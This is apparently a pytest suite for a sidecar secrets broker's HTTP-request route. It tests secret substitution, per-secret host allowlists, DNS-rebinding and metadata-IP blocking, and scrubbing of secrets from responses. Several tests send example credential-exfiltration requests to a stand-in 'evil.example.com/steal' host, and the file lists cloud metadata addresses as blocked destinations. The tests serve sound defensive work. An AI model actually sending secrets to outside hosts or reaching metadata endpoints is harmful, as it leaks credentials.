"""Tests for the sidecar's secrets-broker `POST /http-request` route
(docs/SECRETS-DESIGN.md §3/5).

Covers:
- {{secret:name}} substitution actually happens (the real value is sent,
  not the literal token) before the outbound request is made.
- The destination-host allowlist is enforced per-secret.
- A DNS response that resolves an allowlisted-looking hostname to a
  private/metadata IP is refused (the DNS-rebinding-safe check) -- both at
  the general and per-secret levels.
- A secret name not granted to this session 404s (never leaking whether it
  exists at all for the account).
- Secret values are scrubbed from the response body/headers even when the
  destination echoes them back verbatim.
- The real connection is pinned to the validated IP (via the `sni_hostname`
  extension), not re-resolved a second time at connect.
"""

from __future__ import annotations

import httpx
import main as sidecar_main
from fastapi.testclient import TestClient


def _client() -> TestClient:
    return TestClient(sidecar_main.app)


def _auth_headers() -> dict:
    return {sidecar_main.SIDECAR_AUTH_HEADER: "the-real-secret"}


def _configure_session(monkeypatch, *, session_id="sess-1", names=None, allowed_hosts=None):
    monkeypatch.setitem(sidecar_main.current_session, "session_id", session_id)
    monkeypatch.setitem(sidecar_main.current_session, "secret_names", names or [])
    monkeypatch.setitem(sidecar_main.current_session, "secret_allowed_hosts", allowed_hosts or {})
    monkeypatch.setitem(sidecar_main.current_session, "secret_capability_token", "cap-tok")
    monkeypatch.setitem(sidecar_main.current_session, "secrets_control_plane_url", "https://cp.internal")
    sidecar_main._secret_value_cache.clear()


class _FakeResponse:
    def __init__(self, status_code=200, headers=None, text=""):
        self.status_code = status_code
        self.headers = headers or {}
        self.text = text


class _FakeAsyncClient:
    """Records the request actually sent (post-substitution) and returns a
    canned response -- stands in for the real outbound connection so tests
    never touch the network."""

    last_sent = None
    response = _FakeResponse(200, {"content-type": "text/plain"}, "ok")

    def __init__(self, *args, **kwargs):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    def build_request(self, method, url, headers=None, content=None):
        return httpx.Request(method, url, headers=headers, content=content)

    async def send(self, request):
        type(self).last_sent = request
        return type(self).response


def _patch_outbound(monkeypatch, response=None):
    if response is not None:
        _FakeAsyncClient.response = response
    _FakeAsyncClient.last_sent = None
    monkeypatch.setattr("httpx.AsyncClient", _FakeAsyncClient)


def _patch_safe_dns(monkeypatch, ip="93.184.216.34"):
    async def _fake_resolve(hostname: str) -> str:
        return ip

    monkeypatch.setattr(sidecar_main, "_resolve_and_validate_destination", _fake_resolve)


def test_substitution_sends_real_value_not_literal_token(monkeypatch):
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(
        monkeypatch,
        names=["prod-stripe"],
        allowed_hosts={"prod-stripe": ["api.example.com"]},
    )

    async def _fake_get_secret_value(name):
        assert name == "prod-stripe"
        return "sk_live_the_real_value"

    monkeypatch.setattr(sidecar_main, "_get_secret_value", _fake_get_secret_value)
    _patch_safe_dns(monkeypatch)
    _patch_outbound(monkeypatch)

    client = _client()
    response = client.post(
        "/http-request",
        json={
            "method": "POST",
            "url": "https://api.example.com/v1/charges",
            "headers": {"Authorization": "Bearer {{secret:prod-stripe}}"},
            "body": "amount=2000",
        },
        headers=_auth_headers(),
    )

    assert response.status_code == 200, response.text
    sent = _FakeAsyncClient.last_sent
    assert sent.headers["Authorization"] == "Bearer sk_live_the_real_value"
    assert "{{secret:prod-stripe}}" not in sent.headers["Authorization"]


def test_destination_not_allowed_for_a_secret_not_scoped_to_that_host(monkeypatch):
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(
        monkeypatch,
        names=["prod-stripe"],
        allowed_hosts={"prod-stripe": ["api.stripe.com"]},
    )
    _patch_safe_dns(monkeypatch)
    _patch_outbound(monkeypatch)

    client = _client()
    response = client.post(
        "/http-request",
        json={
            "method": "GET",
            "url": "https://evil.example.com/steal",
            "headers": {"Authorization": "Bearer {{secret:prod-stripe}}"},
        },
        headers=_auth_headers(),
    )

    assert response.status_code == 403
    assert response.json()["detail"] == "destination_not_allowed"
    assert _FakeAsyncClient.last_sent is None


def test_secret_not_granted_to_session_is_404_not_403(monkeypatch):
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(monkeypatch, names=["other-secret"], allowed_hosts={})
    _patch_safe_dns(monkeypatch)
    _patch_outbound(monkeypatch)

    client = _client()
    response = client.post(
        "/http-request",
        json={
            "method": "GET",
            "url": "https://api.example.com/",
            "headers": {"Authorization": "Bearer {{secret:not-granted}}"},
        },
        headers=_auth_headers(),
    )

    assert response.status_code == 404
    assert response.json()["detail"] == "secret_not_referenced_by_session"


def test_dns_rebinding_to_private_ip_is_refused(monkeypatch):
    """The concrete DNS-rebinding scenario: an allowlisted-looking hostname
    resolves to a private/metadata address at request time -- must be
    refused, not silently allowed through."""
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(monkeypatch, names=[], allowed_hosts={})
    _patch_outbound(monkeypatch)

    def _fake_getaddrinfo(hostname, port):
        return [(2, 1, 6, "", ("169.254.169.254", 0))]

    monkeypatch.setattr(sidecar_main._socket, "getaddrinfo", _fake_getaddrinfo)

    client = _client()
    response = client.post(
        "/http-request",
        json={"method": "GET", "url": "https://looks-safe.example.com/"},
        headers=_auth_headers(),
    )

    assert response.status_code == 403
    assert "destination_not_allowed" in response.json()["detail"]
    assert _FakeAsyncClient.last_sent is None


def test_dns_rebinding_refused_even_with_a_mix_of_public_and_private_addresses(monkeypatch):
    """A hostname with BOTH a public and a private/metadata A record must be
    refused outright -- never "pick the safe one and proceed"."""
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(monkeypatch, names=[], allowed_hosts={})
    _patch_outbound(monkeypatch)

    def _fake_getaddrinfo(hostname, port):
        return [
            (2, 1, 6, "", ("93.184.216.34", 0)),
            (2, 1, 6, "", ("169.254.169.254", 0)),
        ]

    monkeypatch.setattr(sidecar_main._socket, "getaddrinfo", _fake_getaddrinfo)

    client = _client()
    response = client.post(
        "/http-request",
        json={"method": "GET", "url": "https://mixed.example.com/"},
        headers=_auth_headers(),
    )
    assert response.status_code == 403


def test_secret_value_scrubbed_from_response_body_and_headers(monkeypatch):
    """A destination that echoes the credential back (e.g. an error message
    containing the key) must not leak it into the tool-call response."""
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(
        monkeypatch,
        names=["prod-stripe"],
        allowed_hosts={"prod-stripe": ["api.example.com"]},
    )

    async def _fake_get_secret_value(name):
        return "sk_live_the_real_value"

    monkeypatch.setattr(sidecar_main, "_get_secret_value", _fake_get_secret_value)
    _patch_safe_dns(monkeypatch)
    _patch_outbound(
        monkeypatch,
        response=_FakeResponse(
            400,
            {"x-error": "invalid key sk_live_the_real_value"},
            'invalid key: sk_live_the_real_value',
        ),
    )

    client = _client()
    response = client.post(
        "/http-request",
        json={
            "method": "POST",
            "url": "https://api.example.com/v1/charges",
            "headers": {"Authorization": "Bearer {{secret:prod-stripe}}"},
            "body": "amount=2000",
        },
        headers=_auth_headers(),
    )

    assert response.status_code == 200
    body = response.json()
    assert "sk_live_the_real_value" not in body["body"]
    assert "sk_live_the_real_value" not in body["headers"]["x-error"]
    assert "[REDACTED_SECRET:prod-stripe]" in body["body"]


def test_unsafe_destination_ip_classification():
    assert sidecar_main._is_disallowed_destination_ip("169.254.169.254") is True
    assert sidecar_main._is_disallowed_destination_ip("127.0.0.1") is True
    assert sidecar_main._is_disallowed_destination_ip("10.0.0.5") is True
    assert sidecar_main._is_disallowed_destination_ip("192.168.1.1") is True
    assert sidecar_main._is_disallowed_destination_ip("::1") is True
    assert sidecar_main._is_disallowed_destination_ip("93.184.216.34") is False


def test_cgnat_metadata_ip_is_disallowed():
    """Alibaba Cloud's IMDS (100.100.100.200) lives in 100.64.0.0/10 (RFC
    6598 CGNAT/shared address space), which ipaddress.is_private does not
    cover -- must be blocked explicitly."""
    assert sidecar_main._is_disallowed_destination_ip("100.100.100.200") is True
    assert sidecar_main._is_disallowed_destination_ip("100.64.0.1") is True
    assert sidecar_main._is_disallowed_destination_ip("100.127.255.254") is True
    assert sidecar_main._is_disallowed_destination_ip("100.63.255.255") is False
    assert sidecar_main._is_disallowed_destination_ip("100.128.0.0") is False


def test_nat64_embedded_metadata_ip_is_disallowed():
    """64:ff9b::a9fe:a9fe is the NAT64 (RFC 6052) synthesized form of
    169.254.169.254 -- must be unwrapped and blocked the same way."""
    assert sidecar_main._is_disallowed_destination_ip("64:ff9b::a9fe:a9fe") is True
    assert sidecar_main._is_disallowed_destination_ip("::ffff:169.254.169.254") is True
    assert sidecar_main._is_disallowed_destination_ip("64:ff9b::808:808") is False


def test_http_request_never_authorizes_via_non_secret_host_source(monkeypatch):
    """Pins that `/http-request` has exactly one source of truth for host
    authorization: `current_session["secret_allowed_hosts"]`. Simulates
    what an MCP-connection grant's host would look like if it were ever
    added to `current_session` under some other key (issue #155's
    unified-policy scoping deliberately does NOT wire a merged grant list
    into the sidecar yet -- see capability_policy.py's module docstring)
    -- that other key must never be consulted as a fallback authorization
    source, even though it names the exact same host the request wants."""
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    _configure_session(
        monkeypatch,
        names=["prod-stripe"],
        allowed_hosts={"prod-stripe": ["api.stripe.com"]},
    )
    # Simulates a hypothetical, not-yet-real "mcp_connection_allowed_hosts"
    # style key granting the requested host via a different mechanism --
    # the route must ignore it entirely and decide only off
    # secret_allowed_hosts for the secret actually referenced.
    monkeypatch.setitem(
        sidecar_main.current_session,
        "mcp_connection_allowed_hosts",
        {"some-mcp-connection": ["evil.example.com"]},
    )
    _patch_safe_dns(monkeypatch)
    _patch_outbound(monkeypatch)

    client = _client()
    response = client.post(
        "/http-request",
        json={
            "method": "GET",
            "url": "https://evil.example.com/steal",
            "headers": {"Authorization": "Bearer {{secret:prod-stripe}}"},
        },
        headers=_auth_headers(),
    )

    assert response.status_code == 403
    assert response.json()["detail"] == "destination_not_allowed"
    assert _FakeAsyncClient.last_sent is None


def test_recycled_pod_configure_clears_secret_value_cache(monkeypatch, tmp_path):
    """A recycled pod must never serve a previous tenant's cached secret
    value to the new session."""
    monkeypatch.setattr(sidecar_main, "SIDECAR_AUTH_TOKEN", "the-real-secret")
    monkeypatch.setattr(sidecar_main, "WORKSPACE_DIR", str(tmp_path / "workspace"))
    monkeypatch.setattr(sidecar_main, "OUTPUTS_DIR", str(tmp_path / "outputs"))
    monkeypatch.setattr(sidecar_main, "UPLOADS_DIR", str(tmp_path / "uploads"))
    monkeypatch.setattr(sidecar_main, "SKILLS_DIR", str(tmp_path / "skills"))
    monkeypatch.setattr(sidecar_main, "TMP_DIR", str(tmp_path / "tmp"))
    monkeypatch.setattr(sidecar_main.os, "chown", lambda *a, **k: None)
    sidecar_main._secret_value_cache["leftover-from-prev-tenant"] = ("old-value", sidecar_main._time.monotonic() + 300)

    client = _client()
    response = client.post("/configure", json={"session_id": "new-session"}, headers=_auth_headers())
    assert response.status_code == 200, response.text
    assert sidecar_main._secret_value_cache == {}
